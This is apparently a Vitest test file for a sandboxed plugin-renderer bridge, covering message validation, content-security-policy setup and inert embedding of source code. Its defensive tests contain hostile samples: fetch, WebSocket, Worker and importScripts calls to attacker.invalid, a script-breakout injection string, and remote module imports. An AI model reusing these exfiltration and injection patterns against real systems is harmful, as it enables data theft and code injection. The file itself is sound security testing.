import { describe, expect, it } from 'vitest'
import { HOMERAIL_A2UI_CATALOG_ID } from 'homerail-protocol'
import { normalizeCustomRendererSource } from '@/api/services/custom-renderer-api'
import {
  buildCustomRendererSrcdoc,
  customRendererInitEnvelope,
  readCustomRendererBridgeMessage,
  type CustomRendererIdentityV1,
} from './custom-renderer-bridge'

const digest = 'a'.repeat(64)
const manifestDigest = 'b'.repeat(64)
const nonce = 'c'.repeat(48)
const sourceWindow = {} as WindowProxy
const identity: CustomRendererIdentityV1 = {
  plugin_id: 'com.example.cards',
  plugin_version: '1.0.0',
  renderer_id: 'card-custom',
  renderer_digest: digest,
  node_id: 'node-one',
  node_revision: 4,
}
const a2ui = {
  version: 'v1.0',
  catalogId: HOMERAIL_A2UI_CATALOG_ID,
  components: [
    { id: 'root', component: 'HrGrid', children: ['metric', 'table'], columns: { default: 2, compact: 1 } },
    { id: 'metric', component: 'HrMetric', label: 'Passed', value: { path: '/passed' }, tone: 'positive' },
    {
      id: 'table', component: 'HrTable', source: { path: '/rows' },
      columns: [{ id: 'name', label: 'Name', path: '/name' }],
    },
  ],
}

function message(type: string, extra: Record<string, unknown> = {}): Record<string, unknown> {
  return { bridge_version: 1, type, nonce, ...identity, ...extra }
}

function read(data: unknown, overrides: Partial<{ source: MessageEventSource | null; origin: string }> = {}) {
  return readCustomRendererBridgeMessage({
    source: overrides.source === undefined ? sourceWindow : overrides.source,
    origin: overrides.origin ?? 'null',
    data,
  }, {
    source: sourceWindow,
    origin: 'null',
    identity,
    nonce,
  })
}

describe('custom Renderer A2UI Worker bridge', () => {
  it('accepts only ready, full-catalog a2ui, and error messages', () => {
    expect(read(message('homerail.custom-renderer.ready'))).toEqual({
      type: 'homerail.custom-renderer.ready',
      ...identity,
    })
    expect(read(message('homerail.custom-renderer.a2ui', { request_id: 'render-1', a2ui }))).toEqual({
      type: 'homerail.custom-renderer.a2ui',
      ...identity,
      request_id: 'render-1',
      a2ui,
    })
    expect(read(message('homerail.custom-renderer.error', { message: 'safe failure' }))).toMatchObject({
      type: 'homerail.custom-renderer.error',
      message: 'safe failure',
    })
    expect(read(message('homerail.custom-renderer.resize', { height: 420 }))).toBeUndefined()
    expect(read(message('homerail.custom-renderer.action', { action_id: 'approve' }))).toBeUndefined()
  })

  it.each([
    ['foreign window', message('homerail.custom-renderer.ready'), { source: {} as WindowProxy }],
    ['foreign origin', message('homerail.custom-renderer.ready'), { origin: 'https://attacker.invalid' }],
    ['missing nonce', (() => { const value = message('homerail.custom-renderer.ready'); delete value.nonce; return value })(), {}],
    ['wrong nonce', { ...message('homerail.custom-renderer.ready'), nonce: 'wrong' }, {}],
    ['wrong plugin', { ...message('homerail.custom-renderer.ready'), plugin_id: 'com.attacker.plugin' }, {}],
    ['wrong version', { ...message('homerail.custom-renderer.ready'), plugin_version: '2.0.0' }, {}],
    ['wrong renderer', { ...message('homerail.custom-renderer.ready'), renderer_id: 'other' }, {}],
    ['wrong digest', { ...message('homerail.custom-renderer.ready'), renderer_digest: 'd'.repeat(64) }, {}],
    ['wrong node', { ...message('homerail.custom-renderer.ready'), node_id: 'node-two' }, {}],
    ['stale revision', { ...message('homerail.custom-renderer.ready'), node_revision: 3 }, {}],
    ['unknown field', { ...message('homerail.custom-renderer.ready'), admin_token: 'steal-me' }, {}],
    ['invalid request id', message('homerail.custom-renderer.a2ui', { request_id: 'stale', a2ui }), {}],
    ['oversized error', message('homerail.custom-renderer.error', { message: 'x'.repeat(501) }), {}],
  ] as const)('rejects %s', (_label, data, overrides) => {
    expect(read(data, overrides)).toBeUndefined()
  })

  it('rejects non-JSON, cyclic, prototype-bearing, and oversized Worker output', () => {
    const cyclic: Record<string, unknown> = {}
    cyclic.self = cyclic
    expect(read(message('homerail.custom-renderer.a2ui', { request_id: 'render-1', a2ui: cyclic }))).toBeUndefined()
    expect(read(message('homerail.custom-renderer.a2ui', {
      request_id: 'render-1', a2ui: { ...a2ui, executable: () => 'no' },
    }))).toBeUndefined()
    expect(read(message('homerail.custom-renderer.a2ui', {
      request_id: 'render-1', a2ui: Object.create({ inherited: true }),
    }))).toBeUndefined()
    expect(read(message('homerail.custom-renderer.a2ui', {
      request_id: 'render-1', a2ui: { ...a2ui, padding: 'x'.repeat(70_000) },
    }))).toBeUndefined()
  })

  it('builds a no-DOM bootstrap with deny-by-default CSP and inert source embedding', () => {
    const hostile = `export async function render(payload){
      location.href='https://attacker.invalid/navigation-leak';
      fetch('https://attacker.invalid/fetch-leak');
      new XMLHttpRequest(); new WebSocket('wss://attacker.invalid');
      new Worker('https://attacker.invalid/recursive-worker.js');
      importScripts('https://attacker.invalid/classic-loader.js');
      return { version: 'v1.0', catalogId: '${HOMERAIL_A2UI_CATALOG_ID}', components: [
        { id: 'root', component: 'Text', text: '</script><img src=https://attacker.invalid>' }
      ] };
    }`
    const srcdoc = buildCustomRendererSrcdoc({
      source: hostile,
      nonce,
      identity,
      parent_origin: 'https://ui.homerail.test',
    })
    expect(srcdoc).toContain("default-src 'none'")
    expect(srcdoc).toContain("connect-src 'none'")
    expect(srcdoc).toContain('worker-src blob:')
    expect(srcdoc).toContain(`script-src 'nonce-${nonce}' blob:`)
    expect(srcdoc).toContain(`script nonce="${nonce}"`)
    expect(srcdoc).toContain("Object.defineProperty(globalThis, name, { value: undefined")
    expect(srcdoc).toContain("'Worker','SharedWorker','importScripts'")
    expect(srcdoc).toContain('jsonClone(rawA2ui)')
    expect(srcdoc).toContain('new Worker(workerUrl')
    expect(srcdoc).not.toContain('document.createElement')
    expect(srcdoc).not.toContain('ResizeObserver')
    expect(srcdoc).not.toContain('homerail.custom-renderer.action')
    expect(srcdoc).not.toContain('homerail.custom-renderer.resize')
    expect(srcdoc).not.toContain('normalizeA2ui')
    expect(srcdoc).not.toContain('</script><img src=https://attacker.invalid>')
    expect(srcdoc).toContain('\\u003c/script>\\u003cimg src=https://attacker.invalid>')
  })

  it('rejects language-level module loaders before an iframe or Worker is created', () => {
    for (const hostile of [
      `import value from 'https://attacker.invalid/static.js'; export function render(payload) { return value }`,
      `export async function render(payload) { return import('https://attacker.invalid/dynamic.js') }`,
      `export function render(payload) { return payload }
       export * from 'https://attacker.invalid/re-export.js'`,
    ]) {
      expect(() => buildCustomRendererSrcdoc({
        source: hostile,
        nonce,
        identity,
        parent_origin: 'https://ui.homerail.test',
      })).toThrow(/imports are forbidden|exactly one named render export/)
    }
  })

  it('creates an immutable parent init envelope without a second action/schema channel', () => {
    const payload = {
      node: { id: 'node-one', revision: 4 },
      placement: { node_id: 'node-one' },
      context: { device: 'desktop' },
    } as never
    const envelope = customRendererInitEnvelope(identity, nonce, payload) as {
      payload: { node: { id: string } };
      action_ids?: string[];
    }
    payload.node.id = 'mutated'
    expect(envelope).toMatchObject({
      type: 'homerail.custom-renderer.init',
      nonce,
      node_id: 'node-one',
      payload: { node: { id: 'node-one' } },
    })
    expect(envelope.action_ids).toBeUndefined()
  })

  it('strictly binds Manager source responses to the projected identity', () => {
    const expected = {
      plugin_id: identity.plugin_id,
      plugin_version: identity.plugin_version,
      manifest_digest: manifestDigest,
      renderer_id: identity.renderer_id,
      file: 'ui/card.mjs',
      digest,
    }
    const response = {
      bridge_api: 1,
      renderer_api: 1,
      ...expected,
      media_type: 'text/javascript',
      content: `export function render(payload) { return { version: 'v1.0', catalogId: '${HOMERAIL_A2UI_CATALOG_ID}', components: [{ id: 'root', component: 'Text', text: String(payload?.node?.id || 'ok') }] } }`,
    }
    expect(normalizeCustomRendererSource(response, expected)).toEqual(response)
    expect(() => normalizeCustomRendererSource({ ...response, plugin_id: 'com.attacker' }, expected))
      .toThrow(/identity mismatch/)
    expect(() => normalizeCustomRendererSource({ ...response, extra: true }, expected))
      .toThrow(/fields/)
  })
})
